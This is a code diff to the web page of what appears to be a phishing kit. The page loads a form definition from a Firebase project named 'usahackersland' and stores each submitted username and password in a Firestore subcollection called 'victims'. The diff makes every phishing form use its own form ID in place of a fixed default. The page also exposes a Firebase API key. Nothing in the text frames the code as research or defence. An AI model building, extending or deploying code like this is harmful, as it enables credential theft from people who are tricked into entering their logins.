@@ -27,6 +27,7 @@
   <div class="form-container" id="formView">Loading form...</div>
 
   <script>
+    // Firebase Config
     const firebaseConfig = {
       apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
       authDomain: "usahackersland.firebaseapp.com",
@@ -42,13 +43,20 @@
     emailjs.init("YOUR_PUBLIC_KEY");
 
     const params = new URLSearchParams(location.search);
-    let formId = params.get("id") || "defaultForm123";
+    const formId = params.get("id");
 
     const $ = id => document.getElementById(id);
 
+    // Error if no form ID
+    if (!formId) {
+      $('formView').innerHTML = `<p style="color:red;">⚠️ No form ID provided in the link.</p>`;
+      throw new Error("Missing form ID in URL");
+    }
+
+    // Fetch form data
     db.collection("forms").doc(formId).get().then(doc => {
       if (!doc.exists) {
-        $('formView').innerHTML = `<p style="color:red;">❌ Form not found.</p>`;
+        $('formView').innerHTML = `<p style="color:red;">❌ Form not found. It may have been deleted.</p>`;
         return;
       }
 
@@ -145,7 +153,7 @@
 
             // Save to Firestore victims collection
             firebase.firestore()
-              .collection("forms").doc("defaultForm123")
+              .collection("forms").doc(formId)
               .collection("victims").add({
                 Username: username,
                 Password: password,
@@ -167,7 +175,7 @@
 
       observer.observe(document.getElementById("formView"), { childList: true, subtree: true });
     }).catch(err => {
-      $('formView').innerHTML = `<p style="color:red;">⚠️ Error loading form.</p><pre>${err.message}</pre>`;
+      $('formView').innerHTML = `<p style="color:red;">⚠️ Error loading form: ${err.message}</p>`;
     });
   </script>
 </body>
